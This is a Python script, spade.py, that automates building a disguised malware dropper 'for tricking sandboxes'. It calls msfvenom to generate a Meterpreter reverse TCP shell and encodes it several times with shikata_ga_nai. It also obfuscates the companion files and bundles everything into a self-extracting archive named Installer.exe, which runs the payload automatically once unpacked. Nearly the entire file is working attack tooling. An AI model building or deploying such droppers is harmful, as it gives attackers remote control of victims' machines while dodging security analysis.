#!/usr/bin/python

"""

spade.py

Script to generate payload for tricking sandboxes.
It relies on MSVENOM package from METASPLOIT.

Yes, I know, it's ugly, but it did its work....;)

 $Id: spade.py,v 1.10 2019/08/13 10:32:41 cesare Exp cesare $

"""

import random
import argparse
import os
import tempfile
from pwn import *

# context.log_level = 'debug'
verbose = 1

def build_package(dropfolder,lhost,lport,payload,encoder,arch,xec,setup):
    #
    # get all files in drop folder (param)
    # scramble and rename them (put a note about it in the ZIP setup)
    # create a zip self extract with everything
    #
    config = ''
    file_map = {}

    config += ';!@Install@!UTF-8!\n'
    config += 'InstallPath="."\n'
    config += 'RunProgram="' + setup + '"\n'

    payloadfile = build_reverse(lhost,lport,payload,encoder,xec,setup)

    file_list = os.listdir(dropfolder)
    for dropfile in file_list:
        # Skip file beginning with _ underscore
        if dropfile[0] == '_':
            log.info('Adding ' + dropfile)
            file_map[dropfile] = dropfile
            continue
        scrambled = scramble_file(dropfolder,dropfile,encoder,arch,xec)
        config += '; Scrambled: ' + dropfile + ' ---> ' + scrambled + '\n'
        file_map[dropfile] = scrambled

    # Save config file
    config += ';!@InstallEnd@!\n'
    open('config.txt','w').write(config)

    # Parse the setup file to change placeholders with scrambled files
    buffer_file = open(dropfolder + '/' + setup,'r').read()
    for placeholder in file_map.keys():
        buffer_file = buffer_file.replace('<' + placeholder + '>',file_map[placeholder])
    open(setup,'w').write(buffer_file)

    # Build the 7z archive with the payload and the scrambled files
    build_7z(payloadfile,file_map,dropfolder,setup)

    # Build the SFX package
    build_sfx('Installer.7z')

    # Clean up
    cleanup(file_map,payloadfile,'Installer.7z',setup)

def build_sfx(archivefile):

    log.info('Creating SFX bundle')

    with open('Installer.exe','wb') as bundle, open('7zS.sfx', 'rb') as sfx, open('config.txt', 'rb') as configfile, \
                                           open(archivefile,'rb') as archive:
        bundle.write(sfx.read())
        bundle.write(configfile.read())
        bundle.write(archive.read())

    bundle.close()

def cleanup(file_map,payloadfile,archivefile,setup):

    log.info('Cleaning up')

    os.remove('config.txt')
    os.remove(setup)
    os.remove(payloadfile)
    os.remove(archivefile)
    for item in file_map.keys():
        if file_map[item][0] != '_':
            os.remove(file_map[item])

def build_7z(payloadfile,file_map,dropfolder,setup):

    log.info('Building 7z archive')

    filestr = payloadfile + ' config.txt '
    for item in file_map.keys():
        # Skip setup file, it will be get from current folder
        if file_map[item] == setup:
            filestr += file_map[item] + ' '
            continue
        # Add all the files mapped from dropfolder
        if file_map[item][0] == "_":
            filestr += dropfolder + '/' + file_map[item] + ' '
        else:
            filestr += file_map[item] + ' '

    sevenzip = process('7z a Installer.7z ' + filestr,shell=True).recvall()

def scramble_file(dropfolder,dropfile,encoder,arch,xec):

    global verbose

    if xec == 'windows':
        xecformat = 'exe'
    elif xec == 'linux':
        xecformat = 'elf'

    # Generate a temporary filename
    scrambled = os.path.basename(tempfile.mktemp())
    scrambled += '.txt'
    iteration = str(random.randint(2,10))
    try:
        if verbose == 1:
            log.info('Scrambling ' + dropfile)

        msv = process('msfvenom -p generic/tight_loop -e ' + encoder + ' -i ' + iteration + ' -a ' + arch + ' -o ' + scrambled +
                      ' --platform ' + xec + ' -f ' + xecformat + ' -k -x ' + dropfolder + '/' + dropfile,shell=True)
        msv.recvall()
        if msv.poll(True) != 0:
            log.error('Error in scrambling file ' + dropfile )

    except:
        sys.exit(1)

    return scrambled

def build_reverse(lhost,lport,payload,encoder,xec,setup):

    global verbose

    if xec == 'windows':
        xecformat = 'exe'
        extension = '.exe'
    elif xec == 'linux':
        xecformat = 'elf'
        extension = ''

    iteration = str(random.randint(7,35))
    # Call msvenom to create the payload
    try:
        if verbose == 1:
            log.info('Executing msvenom building reverse shell')
        setup = setup.split('.')[0] + extension
        msv = process(['msfvenom','-p',payload,'LHOST=' + lhost, 'LPORT=' + lport,'-f',xecformat,'-o',setup,
                       '-e',encoder,'-i',iteration])
        msv.recvall()
        if msv.poll(True) != 0:
            log.error('Error in scrambling file ' + dropfile )

    except:
        sys.exit(1)

    return(setup)

#
# Main function
#
def main(argv):

    global verbose

    # Define default values
    dropfolder = './drop'
    lhost = '127.0.0.1'
    lport = str(random.randint(1025,65535))
    payload = 'windows/meterpreter/reverse_tcp'
    encoder = 'x86/shikata_ga_nai'
    arch = 'x86'
    xec = 'windows'
    setup = '_setup.bat'

    print 'spade.py - v1.9'
	# Check the command line options
    parser = argparse.ArgumentParser(description="Automate Sandbox exploitation")
    parser.add_argument("--drop-folder","-d",dest="dropfolder",type=str,default=dropfolder,
                        help="Folder containing the file to drop")
    parser.add_argument("--verbose","-v",dest="verbose",type=int,default=0,
                        help="Verbose output")
    parser.add_argument("--host","-H",dest="lhost",type=str,default=lhost,
                        help="LHOST for Metasploit payload")
    parser.add_argument("--port","-P",dest="lport",type=str,default=lport,
                        help="LPORT for Metasploit payload")
    parser.add_argument("--payload","-p",dest="payload",type=str,default=payload,
                        help="Metasploit payload")
    parser.add_argument("--encoder","-e",dest="encoder",type=str,default=encoder,
                        help="Metasploit (msfvenom) encoder")
    parser.add_argument("--arch","-a",dest="arch",type=str,default=arch,
                        help="Target architecture (ex. x86)")
    parser.add_argument("--xecutable","-x",dest="xec",type=str,default=xec,
                        help="Target executable format (ex. windows,elf)")
    parser.add_argument("--setup","-s",dest="setup",type=str,default=setup,
                        help="Setup file executed after the archive decompression")
    args = parser.parse_args()

    dropfolder = args.dropfolder.rstrip('/')
    if dropfolder.startswith('/') == False and dropfolder.startswith('.') == False:
        dropfolder = './' + dropfolder
    lhost = args.lhost
    lport = args.lport
    payload = args.payload
    encoder = args.encoder
    arch = args.arch
    xec = args.xec
    setup = args.setup

    log.info('Creating payload with following parameters:')
    log.info('     LHOST: ' + lhost)
    log.info('     LPORT: ' + lport)
    log.info('     Payload: ' + payload)
    log.info('     Encoder: ' + encoder)
    log.info('     Arch: ' + arch)
    log.info('     Xec format: ' + xec)
    log.info('     Setup file: ' + setup)
    log.info('     Drop Folder: ' + dropfolder)

    build_package(dropfolder,lhost,lport,payload,encoder,arch,xec,setup)

if __name__ == "__main__":
    main(sys.argv[1:])
    sys.exit(0)
